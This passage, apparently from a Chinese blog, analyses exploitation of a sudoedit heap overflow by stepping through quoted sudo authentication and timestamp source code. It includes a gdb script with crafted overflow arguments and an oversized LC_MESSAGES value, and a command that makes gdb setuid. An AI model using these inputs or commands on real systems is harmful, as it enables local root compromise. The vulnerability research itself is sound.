validated, <span class="keyword">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">getpass_closure</span> <span class="title">closure</span> = &#123;</span> TS_ERROR &#125;;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">bool</span> exempt = <span class="literal">false</span>;</span><br><span class="line">    debug_decl(check_user, SUDOERS_DEBUG_AUTH)</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Init authentication system regardless of whether we need a password.</span></span><br><span class="line"><span class="comment">     * Required for proper PAM session support.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> ((closure.auth_pw = get_authpw(mode)) == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">goto</span> done;</span><br><span class="line">    <span class="keyword">if</span> (sudo_auth_init(closure.auth_pw) == <span class="number">-1</span>)</span><br><span class="line"><span class="keyword">goto</span> done;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Don't prompt for the root passwd or if the user is exempt.</span></span><br><span class="line"><span class="comment">     * If the user is not changing uid/gid, no need for a password.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (!def_authenticate || user_is_exempt()) &#123;</span><br><span class="line">sudo_debug_printf(SUDO_DEBUG_INFO, <span class="string">"%s: %s"</span>, __func__,</span><br><span class="line">    !def_authenticate ? <span class="string">"authentication disabled"</span> :</span><br><span class="line">    <span class="string">"user exempt from authentication"</span>);</span><br><span class="line">exempt = <span class="literal">true</span>;</span><br><span class="line">ret = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (user_uid == <span class="number">0</span> || (user_uid == runas_pw-&gt;pw_uid &amp;&amp;</span><br><span class="line">(!runas_gr || (sudo_user.pw, runas_gr-&gt;gr_name)))) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_SELINUX</span></span><br><span class="line"><span class="keyword">if</span> (user_role == <span class="literal">NULL</span> &amp;&amp; user_type == <span class="literal">NULL</span>)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_PRIV_SET</span></span><br><span class="line"><span class="keyword">if</span> (runas_privs == <span class="literal">NULL</span> &amp;&amp; runas_limitprivs == <span class="literal">NULL</span>)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#123;</span><br><span class="line">    sudo_debug_printf(SUDO_DEBUG_INFO,</span><br><span class="line"><span class="string">"%s: user running command as self"</span>, __func__);</span><br><span class="line">    ret = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">goto</span> done;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ret = check_user_interactive(validated, mode, &amp;closure);</span><br><span class="line"></span><br><span class="line">done:</span><br><span class="line">    <span class="keyword">if</span> (ret == <span class="literal">true</span>) &#123;</span><br><span class="line"><span class="comment">/* The approval function may disallow a user post-authentication. */</span></span><br><span class="line">ret = sudo_auth_approval(closure.auth_pw, validated, exempt);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Only update time stamp if user validated and was approved.</span></span><br><span class="line"><span class="comment"> * Failure to update the time stamp is not a fatal error.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (ret == <span class="literal">true</span> &amp;&amp; closure.tstat != TS_ERROR) &#123;</span><br><span class="line">    <span class="keyword">if</span> (ISSET(validated, VALIDATE_SUCCESS))</span><br><span class="line">(<span class="keyword">void</span>)timestamp_update(closure.cookie, closure.auth_pw);</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    timestamp_close(closure.cookie);</span><br><span class="line">    sudo_auth_cleanup(closure.auth_pw);</span><br><span class="line">    <span class="keyword">if</span> (closure.auth_pw != <span class="literal">NULL</span>)</span><br><span class="line">sudo_pw_delref(closure.auth_pw);</span><br><span class="line"></span><br><span class="line">    debug_return_int(ret);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我发现我断不下来。呜呜</p><p>然后去看了别人的exp，发现是启动的问题,要多加一个 -A，然后还有设置环境变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUDO_ASKPASS=/bin/false</span><br></pre></td></tr></table></figure><p>然后就进去了</p><p>这里先用gdb调试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod u+s /usr/bin/gdb</span><br></pre></td></tr></table></figure><p>然后可以让gdb有了普通权限调试sudo程序了</p><p>下面是调试脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exe</span><span class="params">(cmd)</span>:</span></span><br><span class="line">    gdb.execute(cmd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.execute(<span class="string">'r'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">end</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.execute(<span class="string">'quit'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">kill</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.execute(<span class="string">'kill'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bp</span><span class="params">(cmd)</span>:</span></span><br><span class="line">    exe(cmd)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set</span><span class="params">(cmd)</span>:</span></span><br><span class="line">    exe(<span class="string">"set "</span>+cmd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    exe(<span class="string">'file /usr/local/bin/sudoedit'</span>)</span><br><span class="line">    payload = <span class="string">"set args -s 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\'"</span></span><br><span class="line">    exe(payload)</span><br><span class="line">    start()</span><br><span class="line">    exe(<span class="string">'set environment SUDO_ASKPASS /bin/false'</span>)</span><br><span class="line">    bp(<span class="string">"b timestamp_open"</span>)</span><br><span class="line">    bp(<span class="string">"b check.c:193"</span>)</span><br><span class="line">    bp(<span class="string">"b timestamp_lock"</span>)</span><br><span class="line">    bp(<span class="string">"b check_user_interactive"</span>)</span><br><span class="line">    bp(<span class="string">"b timestamp.c:204"</span>)</span><br><span class="line">    bp(<span class="string">"b timestamp.c:210"</span>)</span><br><span class="line">    <span class="comment">#bp("b sudoers.c:854")</span></span><br><span class="line">    <span class="comment">#bp("b sudoers.c:870")</span></span><br><span class="line">    bp(<span class="string">"set follow-fork-mode parent"</span>)</span><br><span class="line">    set(<span class="string">"args -A -s '\\' '1111111111111111111111111111111111111111ayylmaobigchungussssssssssss000000000000000000000000000000000000000000000000000000000001'"</span>)</span><br><span class="line">    exe(<span class="string">"set environment LC_MESSAGES C.UTF-8@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"</span>)</span><br><span class="line">    start()</span><br><span class="line">    <span class="comment">#exe('c')</span></span><br><span class="line">    <span class="comment">#exe('c')</span></span><br><span class="line">    <span class="comment">#set("sudo_user.uid=1000")</span></span><br><span class="line">    <span class="comment">#set("sudo_user.gid=1000")</span></span><br><span class="line">    <span class="comment">#set("*(long long int*)(sudo_user.name)=0x697a6579")</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>然后就一步步走了</p><p>那就从check_user 函数开始</p><p>check_user 里面会有个验证uid，这个uid是存储在 sudo里面的一个全局的结构体 sudo_user 里面</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (user_uid == <span class="number">0</span> || (user_uid == runas_pw-&gt;pw_uid &amp;&amp; <span class="comment">//[1]</span></span><br><span class="line">(!runas_gr || (sudo_user.pw, runas_gr-&gt;gr_name)))) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_SELINUX</span></span><br><span class="line"><span class="keyword">if</span> (user_role == <span class="literal">NULL</span> &amp;&amp; user_type == <span class="literal">NULL</span>)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_PRIV_SET</span></span><br><span class="line"><span class="keyword">if</span> (runas_privs == <span class="literal">NULL</span> &amp;&amp; runas_limitprivs == <span class="literal">NULL</span>)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#123;</span><br><span class="line">    sudo_debug_printf(SUDO_DEBUG_INFO,</span><br><span class="line"><span class="string">"%s: user running command as self"</span>, __func__);</span><br><span class="line">    ret = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">goto</span> done;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ret = check_user_interactive(validated, mode, &amp;closure);<span class="comment">//[2]</span></span><br></pre></td></tr></table></figure><p>因为 [1] 处user_uid=1000,然后后面的判断也不成立，就进入了 [2]</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">check_user_interactive(<span class="keyword">int</span> validated, <span class="keyword">int</span> mode, struct getpass_closure *closure)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sudo_conv_callback</span> <span class="title">cb</span>, *<span class="title">callback</span> = <span class="title">NULL</span>;</span></span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">char</span> *prompt;</span><br><span class="line">    <span class="keyword">bool</span> lectured;</span><br><span class="line">    debug_decl(check_user_interactive, SUDOERS_DEBUG_AUTH)</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Open, lock and read time stamp file if we are using it. */</span></span><br><span class="line">    <span class="keyword">if</span> (!ISSET(mode, MODE_IGNORE_TICKET)) &#123;</span><br><span class="line"><span class="comment">/* Open time stamp file and check its status. */</span></span><br><span class="line">closure-&gt;cookie = timestamp_open(user_name, user_sid); <span class="comment">//[1]</span></span><br><span class="line"><span class="keyword">if</span> (timestamp_lock(closure-&gt;cookie, closure-&gt;auth_pw))<span class="comment">//[2]</span></span><br><span class="line">    closure-&gt;tstat = timestamp_status(closure-&gt;cookie, closure-&gt;auth_pw);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Construct callback for getpass function. */</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;cb, <span class="number">0</span>, <span class="keyword">sizeof</span>(cb));</span><br><span class="line">cb.version = SUDO_CONV_CALLBACK_VERSION;</span><br><span class="line">cb.closure = closure;</span><br><span class="line">cb.on_suspend = getpass_suspend;</span><br><span class="line">cb.on_resume = getpass_resume;</span><br><span class="line">callback = &amp;cb;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (closure-&gt;tstat) &#123;</span><br><span class="line">    <span class="keyword">case</span> TS_FATAL:</span><br><span class="line"><span class="comment">/* Fatal error (usually setuid failure), unsafe to proceed. */</span></span><br><span class="line"><span class="keyword">goto</span> done;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> TS_CURRENT:</span><br><span class="line"><span class="comment">/* Time stamp file is valid and current. */</span></span><br><span class="line"><span class="keyword">if</span> (!ISSET(validated, FLAG_CHECK_USER)) &#123;</span><br><span class="line">    ret = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">sudo_debug_printf(SUDO_DEBUG_INFO,</span><br><span class="line">    <span class="string">"%s: check user flag overrides time stamp"</span>, __func__);</span><br><span class="line"><span class="comment">/* FALLTHROUGH */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line"><span class="comment">/* Bail out if we are non-interactive and a password is required */</span></span><br><span class="line"><span class="keyword">if</span> (ISSET(mode, MODE_NONINTERACTIVE)) &#123;</span><br><span class="line">    validated |= FLAG_NON_INTERACTIVE;</span><br><span class="line">    log_auth_failure(validated, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">goto</span> done;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* XXX - should not lecture if askpass helper is being used. */</span></span><br><span class="line">lectured = display_lecture(closure-&gt;tstat);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Expand any escapes in the prompt. */</span></span><br><span class="line">prompt = expand_prompt(user_prompt ? user_prompt : def_passprompt,</span><br><span class="line">    closure-&gt;auth_pw-&gt;pw_name);</span><br><span class="line"><span class="keyword">if</span> (prompt == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">goto</span> done;</span><br><span class="line"></span><br><span class="line">ret = verify_user(closure-&gt;auth_pw, prompt, validated, callback);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="literal">true</span> &amp;&amp; lectured)</span><br><span class="line">    (<span class="keyword">void</span>)set_lectured();<span class="comment">/* lecture error not fatal */</span></span><br><span class="line"><span class="built_in">free</span>(prompt);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">done:</span><br><span class="line">    debug_return_int(ret);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重点就在 [1] [2]</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">timestamp_open(<span class="keyword">const</span> <span class="keyword">char</span> *user, <span class="keyword">pid_t</span> sid)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ts_cookie</span> *<span class="title">cookie</span>;</span></span><br><span class="line">    <span class="keyword">char</span> *fname = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">int</span> tries, fd = <span class="number">-1</span>;</span><br><span class="line">    debug_decl(timestamp_open, SUDOERS_DEBUG_AUTH)</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Zero timeout means don't use the time stamp file. */</span></span><br><span class="line">    <span class="keyword">if</span> (!sudo_timespecisset(&amp;def_timestamp_timeout)) &#123;</span><br><span class="line">errno = ENOENT;</span><br><span class="line"><span class="keyword">goto</span> bad;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Sanity check timestamp dir and create if missing. */</span></span><br><span class="line">    <span class="keyword">if</span> (!ts_secure_dir(def_timestampdir, <span class="literal">true</span>, <span class="literal">false</span>))<span class="comment">//[1]</span></span><br><span class="line"><span class="keyword">goto</span> bad;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Open time stamp file. */</span></span><br><span class="line">    <span class="keyword">if</span> (asprintf(&amp;fname, <span class="string">"%s/%s"</span>, def_timestampdir, user) == <span class="number">-1</span>) &#123; <span class="comment">//[2]</span></span><br><span class="line">sudo_warnx(U_(<span class="string">"%s: %s"</span>), __func__, U_(<span class="string">"unable to allocate memory"</span>));</span><br><span class="line"><span class="keyword">goto</span> bad;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (tries = <span class="number">1</span>; ; tries++) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">sb</span>;</span></span><br><span class="line"><span class="comment">// 上面能看到 (asprintf(&amp;fname, "%s/%s", def_timestampdir, user)  这个是配置 stampfile的文件名字的</span></span><br><span class="line">fd = ts_open(fname, O_RDWR|O_CREAT);</span><br><span class="line"><span class="keyword">switch</span> (fd) &#123;</span><br><span class="line"><span class="keyword">case</span> TIMESTAMP_OPEN_ERROR:</span><br><span class="line">    log_warning(SLOG_SEND_MAIL, N_(<span class="string">"unable to open %s"</span>), fname);</span><br><span class="line">    <span class="keyword">goto</span> bad;</span><br><span class="line"><span class="keyword">case</span> TIMESTAMP_PERM_ERROR:</span><br><span class="line">    <span class="comment">/* Already logged set_perms/restore_perms error. */</span></span><br><span class="line">    <span class="keyword">goto</span> bad;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Remove time stamp file if its mtime predates boot time. */</span></span><br><span class="line"><span class="keyword">if</span> (tries == <span class="number">1</span> &amp;&amp; fstat(fd, &amp;sb) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">boottime</span>, <span class="title">mtime</span>, <span class="title">now</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sudo_gettime_real(&amp;now) == <span class="number">0</span> &amp;&amp; get_boottime(&amp;boottime)) &#123;</span><br><span class="line"><span class="comment">/* Ignore a boot time that is in the future. */</span></span><br><span class="line"><span class="keyword">if</span> (sudo_timespeccmp(&amp;now, &amp;boottime, &lt;)) &#123;</span><br><span class="line">    sudo_debug_printf(SUDO_DEBUG_WARN|SUDO_DEBUG_LINENO,</span><br><span class="line"><span class="string">"ignoring boot time that is in the future"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    mtim_get(&amp;sb, mtime);</span><br><span class="line">    <span class="keyword">if</span> (sudo_timespeccmp(&amp;mtime, &amp;boottime, &lt;)) &#123;</span><br><span class="line"><span class="comment">/* Time stamp file too old, remove it. */</span></span><br><span class="line">sudo_debug_printf(SUDO_DEBUG_WARN|SUDO_DEBUG_LINENO,</span><br><span class="line">    <span class="string">"removing time stamp file that predates boot time"</span>);</span><br><span class="line">close(fd);</span><br><span class="line">unlink(fname);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Allocate and fill in cookie to store state. */</span></span><br><span class="line">    cookie = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(*cookie));</span><br><span class="line">    <span class="keyword">if</span> (cookie == <span class="literal">NULL</span>) &#123;</span><br><span class="line">sudo_warnx(U_(<span class="string">"%s: %s"</span>), __func__, U_(<span class="string">"unable to allocate memory"</span>));</span><br><span class="line"><span class="keyword">goto</span> bad;</span><br><span class="line">    &#125;</span><br><span class="line">    cookie-&gt;fd = fd;</span><br><span class="line">    cookie-&gt;fname = fname;</span><br><span class="line">    cookie-&gt;sid = sid;</span><br><span class="line">    cookie-&gt;pos = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    debug_return_ptr(cookie);</span><br><span class="line">bad:</span><br><span class="line">    <span class="keyword">if</span> (fd != <span class="number">-1</span>)</span><br><span class="line">close(fd);</span><br><span class="line">    <span class="built_in">free</span>(fname);</span><br><span class="line">    debug_return_ptr(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们溢出，修改了 def_timestampdir 那么在  timestamp_open的时候 那么在经过了 [1]</p><p>ts_secure_dir 检查 这个路径之后 就会来到 [2] 处，这里会组装路径，user就是你的普通用户的名字</p><p>def_timestampdir  受我们控制，那么现在先说 怎么绕过 ts_secure_dir 的检测</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">bool</span></span><br><span class="line">ts_secure_dir(<span class="keyword">char</span> *path, <span class="keyword">bool</span> make_it, <span class="keyword">bool</span> quiet)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">sb</span>;</span></span><br><span class="line">    <span class="keyword">bool</span> ret = <span class="literal">false</span>;</span><br><span class="line">    debug_decl(ts_secure_dir, SUDOERS_DEBUG_AUTH)</span><br><span class="line"></span><br><span class="line">    sudo_debug_printf(SUDO_DEBUG_INFO|SUDO_DEBUG_LINENO, <span class="string">"checking %s"</span>, path);</span><br><span class="line">    <span class="keyword">switch</span> (sudo_secure_dir(path, timestamp_uid, <span class="number">-1</span>, &amp;sb)) &#123;<span class="comment">//[1]</span></span><br><span class="line">    <span class="keyword">case</span> SUDO_PATH_SECURE:</span><br><span class="line">ret = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> SUDO_PATH_MISSING:</span><br><span class="line"><span class="keyword">if</span> (make_it &amp;&amp; ts_mkdirs(path, timestamp_uid, timestamp_gid, S_IRWXU,<span class="comment">//[2]</span></span><br><span class="line">    S_IRWXU|S_IXGRP|S_IXOTH, quiet)) &#123;</span><br><span class="line">    ret = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">errno = ENOENT;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> SUDO_PATH_BAD_TYPE:</span><br><span class="line">errno = ENOTDIR;</span><br><span class="line"><span class="keyword">if</span> (!quiet)</span><br><span class="line">    sudo_warn(<span class="string">"%s"</span>, path);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> SUDO_PATH_WRONG_OWNER:</span><br><span class="line"><span class="keyword">if</span> (!quiet) &#123;</span><br><span class="line">    sudo_warnx(U_(<span class="string">"%s is owned by uid %u, should be %u"</span>),</span><br><span class="line">path, (<span class="keyword">unsigned</span> <span class="keyword">int</span>) sb.st_uid,</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">int</span>) timestamp_uid);</span><br><span class="line">&#125;</span><br><span class="line">errno = EACCES;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> SUDO_PATH_GROUP_WRITABLE:</span><br><span class="line"><span class="keyword">if</span> (!quiet)</span><br><span class="line">    sudo_warnx(U_(<span class="string">"%s is group writable"</span>), path);</span><br><span class="line">errno = EACCES;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    debug_return_bool(ret);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">bool</span></span><br><span class="line">ts_mkdirs(<span class="keyword">char</span> *path, <span class="keyword">uid_t</span> owner, <span class="keyword">gid_t</span> group, <span class="keyword">mode_t</span> mode,</span><br><span class="line">    <span class="keyword">mode_t</span> parent_mode, <span class="keyword">bool</span> quiet)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">bool</span> ret;</span><br><span class="line">    <span class="keyword">mode_t</span> omask;</span><br><span class="line">    debug_decl(ts_mkdirs, 